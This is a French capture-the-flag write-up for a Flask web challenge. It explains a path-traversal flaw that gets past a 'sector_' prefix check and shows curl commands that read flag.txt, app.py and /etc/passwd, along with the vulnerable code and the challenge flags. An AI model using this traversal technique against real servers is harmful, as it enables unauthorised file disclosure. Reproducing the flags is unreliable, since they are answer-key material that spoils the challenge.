# La salle des cartes (HacKagou 2026) — Web

**Flag :** `OPENNC{a6b9bdff-fc51-48cc-acbb-b0a056ca7b52}`
**Valeur :** 100 pts · **Catégorie :** Web (instance Docker)
**Statut :** ✅ résolu

> ⚠️ Flag **dynamique, unique par instance** (injecté par ctfd-whale via la variable
> d'env `FLAG`). Celui-ci = instance `challs.hackagou.nc:49877`. Sur une autre instance,
> rejouer le path traversal ci-dessous pour lire son propre `flag.txt`.

## Énoncé

Appli Flask « La Salle des Cartes » : une table hydrographique qui charge des
**tuiles bathymétriques binaires** via un champ « Nom de tuile personnalisé (API) ».
Chaque tuile est renvoyée au format binaire maison `NAUT` (magic + len + status + payload).

## Reconnaissance

`public/script.js` montre l'appel :

```js
fetch(`/api/sonar/tile?sector=${encodeURIComponent(sectorName)}`)
```

Une tuile normale (`sector=sector_alpha_1`) renvoie :

```
NAUT....m..BATHYMETRY_V2 | SECTOR: Dumbéa Entrée | DEPTH: [...] | CONTOUR_SECTOR_A1
```

Le paramètre `sector` sert à construire un **chemin de fichier** côté serveur → piste
**path traversal / LFI**. Les tentatives directes sont bloquées :

```
sector=../../etc/passwd  →  403  "Access Denied. Sector query must begin with 'sector_'"
```

La seule protection est donc un **contrôle de préfixe** (`startswith('sector_')`), pas un
anti-traversal. Il suffit de préfixer `sector_` puis de remonter l'arborescence.

## Exploitation

### Lecture de fichiers arbitraires

```bash
U=http://challs.hackagou.nc:49877
# flag.txt (deux crans au-dessus du dossier tiles/)
curl -s "$U/api/sonar/tile?sector=sector_/../../flag.txt"            # -> OPENNC{a6b9bdff-...}
# code source
curl -s "$U/api/sonar/tile?sector=sector_/../../app.py"
# preuve LFI hors app
curl -s "$U/api/sonar/tile?sector=sector_/../../../etc/passwd"       # -> root:x:0:0:...
```

(La réponse est encapsulée dans l'entête `NAUT` : 4 o magic + `uint32` longueur +
`uint16` status, puis le contenu du fichier.)

### Pourquoi ça marche (vu dans `app.py`)

```python
if not sector.startswith('sector_'):          # seule vérif -> contournable
    return 403
decoded_sector = urllib.parse.unquote(sector)
target_rel = decoded_sector if decoded_sector.endswith('.bin') else decoded_sector + '.bin'
target_path = os.path.normpath(os.path.join(TILES_DIR, target_rel))   # normpath résout les ../
if not os.path.exists(target_path):
    target_path_nobin = os.path.normpath(os.path.join(TILES_DIR, decoded_sector))  # retente SANS .bin
    if os.path.exists(target_path_nobin): target_path = target_path_nobin
    ...
open(target_path, 'rb')
```

`os.path.normpath` réduit `tiles/sector_/../../flag.txt` → `flag.txt` à la racine de l'app.
Le préfixe `sector_` (suivi de `/..`) satisfait le `startswith` tout en étant annulé par la
remontée. Le double essai avec/sans `.bin` permet de lire aussi les fichiers non `.bin`.

### Quel flag ?

```python
FLAG = os.getenv("FLAG", "OPENNC{C4rt0gr4ph13_d35_pr0f0nd3ur5_dumb34_2026}")
open(FLAG_PATH, 'w').write(FLAG)
```

Le flag hardcodé (`C4rt0gr4ph13...`) n'est que le **défaut**. Comme `flag.txt` contient ici
un **UUID**, c'est que la variable d'env `FLAG` est fournie par whale → le **vrai flag est
celui de `flag.txt`** (flag dynamique validé par CTFd).

## Flag

```
OPENNC{a6b9bdff-fc51-48cc-acbb-b0a056ca7b52}
```

Source complète : [`app.py`](app.py).
